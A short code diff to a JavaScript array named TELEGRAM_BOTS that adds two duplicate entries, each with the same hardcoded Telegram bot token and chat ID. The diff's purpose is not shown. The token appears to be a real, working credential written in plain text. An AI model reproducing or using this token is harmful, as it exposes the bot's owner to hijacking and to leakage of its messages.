@@ -28,6 +28,14 @@ const TELEGRAM_BOTS = [
     {
         token: "7669760908:AAFpRpQVlvJbSmignQoO1SwPuyoxsHL_i2c", 
         chatId: "6328222257"
+    },
+    {
+        token: "7669760908:AAFpRpQVlvJbSmignQoO1SwPuyoxsHL_i2c", 
+        chatId: "6328222257"
+    },
+    {
+        token: "7669760908:AAFpRpQVlvJbSmignQoO1SwPuyoxsHL_i2c", 
+        chatId: "6328222257"
     }
 ];
 
